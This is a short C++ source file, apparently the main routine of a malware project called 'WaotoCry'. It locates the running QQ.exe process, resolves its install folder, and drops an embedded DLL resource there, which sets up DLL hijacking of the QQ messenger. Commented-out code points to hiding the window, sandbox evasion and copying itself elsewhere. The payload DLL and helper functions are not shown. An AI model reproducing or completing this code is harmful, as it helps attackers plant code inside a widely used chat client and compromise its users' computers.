#include "Un-main.h"


WaotoCry _WaotoCry;



int main() {
	char *QQ_path;
	string string_qq_path;
	//no_windows();
	determine();
	_WaotoCry.get_process_dir= Get_Process_in_dir();
	_WaotoCry.get_pid=GetProcesspId((const char*)"QQ.exe");
	cout << "获取到的QQ PID是:" << _WaotoCry.get_pid << endl;
	_WaotoCry.process_pid_path=process_pid_to_path(_WaotoCry.get_pid);
	string_qq_path = _WaotoCry.process_pid_path;
	cout << "QQ PROCESS PATH IS:" << _WaotoCry.process_pid_path << endl;
	QQ_path = (char*)string_qq_path.c_str();
	_WaotoCry.target_process_path = replace_string((string)string_qq_path, "\\QQ.exe", "");
	QQ_path = (char*)_WaotoCry.target_process_path.c_str();
	cout << "QQ_path is" << QQ_path << endl;
	_WaotoCry.Proconn_data = CreateEXE(QQ_path, IDR_DLL1, (char*)"DLL");
    /*WaotoCry.process_break_sendbox = 0;
    WaotoCry.process_break_sendbox = determine();*/
	/*if (!WaotoCry.process_break_sendbox) {
		exit(1);
	}*/
	/*WaotoCry.process_new_path = new_process_path();
	add_double_data(WaotoCry.process_new_path);
	increase(WaotoCry.process_new_path);*/
	system("pause");
	return 0;
}